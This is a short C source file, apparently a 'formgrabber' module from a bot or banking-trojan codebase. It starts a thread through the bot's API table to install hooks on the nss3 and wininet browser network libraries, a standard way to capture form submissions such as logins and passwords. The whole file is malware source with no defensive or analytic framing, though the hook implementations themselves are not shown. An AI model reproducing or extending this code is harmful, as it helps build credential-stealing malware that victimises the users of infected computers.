#include "formgrabber.h"

#ifdef MODULE_FORMGRABBER
#include "nss3.h"
#include "wininet.h"

#include "hook.h"

extern bot_t bot;

DWORD WINAPI dwFormgrabber_EntryPoint()
{
	InstallNss3Hooks();
	InstallWininetHooks();

	return 0;
}

BOOL WINAPI InstallFormgrabberHooks()
{
	bot.api.pCreateThread(0, 0, (LPTHREAD_START_ROUTINE)dwFormgrabber_EntryPoint, NULL, 0, NULL);

	return TRUE;
}
#endif